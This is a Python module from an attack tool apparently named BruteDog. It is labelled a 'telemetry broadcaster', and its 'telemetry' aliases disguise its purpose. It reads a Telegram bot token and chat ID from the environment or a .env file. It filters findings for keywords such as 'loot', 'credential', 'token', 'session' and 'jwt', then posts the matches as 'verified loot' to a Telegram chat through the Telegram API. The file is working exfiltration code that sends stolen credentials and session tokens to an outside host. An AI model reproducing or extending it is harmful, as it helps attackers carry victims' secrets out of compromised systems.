#!/usr/bin/env python3
"""
TELEMETRY_BROADCASTER.PY v8.8 — Centralized Zero-Noise Telemetry Dispatcher
"""
import asyncio
import html
import json
import os
from pathlib import Path
from typing import Any, Dict, Union

import httpx

BASE_DIR = Path(__file__).resolve().parent.parent


def _load_dotenv_value(key: str) -> str:
    env_path = BASE_DIR / ".env"
    if not env_path.exists():
        return ""
    try:
        for line in env_path.read_text(encoding="utf-8", errors="ignore").splitlines():
            stripped = line.strip()
            if not stripped or stripped.startswith("#") or "=" not in stripped:
                continue
            k, v = stripped.split("=", 1)
            if k.strip() == key:
                return v.strip().strip('"').strip("'")
    except Exception:
        pass
    return ""


def _resolve_telegram_config() -> tuple[str, str]:
    token = (
        os.getenv("TELEGRAM_BOT_TOKEN")
        or os.getenv("BRUTEDOG_TG_TOKEN")
        or _load_dotenv_value("TELEGRAM_BOT_TOKEN")
        or _load_dotenv_value("BRUTEDOG_TG_TOKEN")
        or ""
    ).strip()
    chat_id = (
        os.getenv("TELEGRAM_CHAT_ID")
        or os.getenv("BRUTEDOG_TG_CHAT")
        or _load_dotenv_value("TELEGRAM_CHAT_ID")
        or _load_dotenv_value("BRUTEDOG_TG_CHAT")
        or ""
    ).strip()
    return token, chat_id


HIGH_VALUE_KEYWORDS = [
    "critical",
    "bypass",
    "success",
    "loot",
    "token",
    "session",
    "admin",
    "credential",
    "compromised",
    "race",
    "pivot",
    "jwt",
    "dump",
]

_background_tasks: set[asyncio.Task] = set()


def _esc(value: object) -> str:
    if isinstance(value, (dict, list)):
        raw = json.dumps(value, default=str)
    else:
        raw = str(value)
    return html.escape(raw)


async def broadcast_loot(vector: str, details: Union[Dict[str, Any], str]):
    """
    Centralized asynchronous dispatcher for BruteDog modules.
    Enforces a strict zero-noise filter before pushing verified loot to Telegram.
    """
    bot_token, chat_id = _resolve_telegram_config()
    if not bot_token or not chat_id:
        return

    serialized = (
        json.dumps(details, indent=2, default=str)
        if isinstance(details, (dict, list))
        else str(details or "")
    )
    check_str = f"{vector} {serialized}".lower()
    if not any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
        return

    api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    vector_label = str(vector or "LOOT").upper()

    if isinstance(details, dict):
        lines = [f"• <b>{_esc(k)}</b>: <code>{_esc(v)}</code>" for k, v in details.items()]
        details_str = "\n".join(lines)
    else:
        details_str = f"<code>{_esc(serialized)}</code>"

    header = (
        "🚨 <b>BRUTEDOG V8.8 — VERIFIED COGNITIVE LOOT</b> 🚨\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 <b>Vector:</b> <code>{_esc(vector_label)}</code>\n\n"
    )
    footer = "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    full_msg = header + details_str + footer

    max_chunk_size = 3800
    if len(full_msg) > max_chunk_size:
        chunks = [details_str[i : i + max_chunk_size] for i in range(0, len(details_str), max_chunk_size)]
        messages = [
            (
                f"🚨 <b>BRUTEDOG V8.8 [Part {idx}/{len(chunks)}]</b> 🚨\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🎯 <b>Vector:</b> <code>{_esc(vector_label)}</code>\n\n"
                f"{chunk}\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            )
            for idx, chunk in enumerate(chunks, 1)
        ]
    else:
        messages = [full_msg]

    try:
        async with httpx.AsyncClient(timeout=8.0) as client:
            for msg in messages:
                payload = {
                    "chat_id": chat_id,
                    "text": msg,
                    "parse_mode": "HTML",
                    "disable_web_page_preview": True,
                }
                await client.post(api_url, json=payload)
                if len(messages) > 1:
                    await asyncio.sleep(0.3)
    except Exception:
        pass


def broadcast_loot_sync(vector: str, details: Union[Dict[str, Any], str]):
    """Synchronous wrapper for modules running in threads or non-async contexts."""
    try:
        loop = asyncio.get_running_loop()
        if not loop.is_closed():
            task = loop.create_task(broadcast_loot(vector, details))
            _background_tasks.add(task)
            task.add_done_callback(_background_tasks.discard)
    except RuntimeError:
        try:
            asyncio.run(broadcast_loot(vector, details))
        except Exception:
            pass


send_telemetry_alert = broadcast_loot
send_telemetry_alert_sync = broadcast_loot_sync
